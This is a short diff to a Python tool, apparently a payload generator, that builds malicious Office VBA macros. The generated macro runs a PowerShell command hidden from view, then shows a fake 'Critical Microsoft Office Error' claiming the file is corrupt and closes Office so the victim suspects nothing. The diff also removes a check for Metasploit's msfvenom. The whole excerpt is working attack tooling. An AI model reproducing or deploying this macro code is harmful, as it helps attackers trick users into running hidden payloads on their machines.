@@ -244,9 +244,10 @@ def generate_macro(full_attack, line_length=380):
     macro_str = macro_str[:-4]
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
+    macro_str = macro_str.replace("powershell -window", "-window")
 
     # end of macro
-    macro_str += """"\nShell ("POWERSHELL.EXE " & x)\nDim title As String\ntitle = "Critical Microsoft Office Error"\nDim msg As String\nDim intResponse As Integer\nmsg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
+    macro_str += """"\nShell ("powershell.exe " & x)\nDim title As String\ntitle = "Critical Microsoft Office Error"\nDim msg As String\nDim intResponse As Integer\nmsg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
     return macro_str
 
 
@@ -434,9 +435,6 @@ try:
     attack_modifier = ""
     payload = ""
     ps1path = ""
-
-	if not os.popen("msfvenom -h").read():
-		sys.exit("\nPlease install metasploit first.\n")
 
     if len(sys.argv) > 1:
         if sys.argv[1] == "--help":
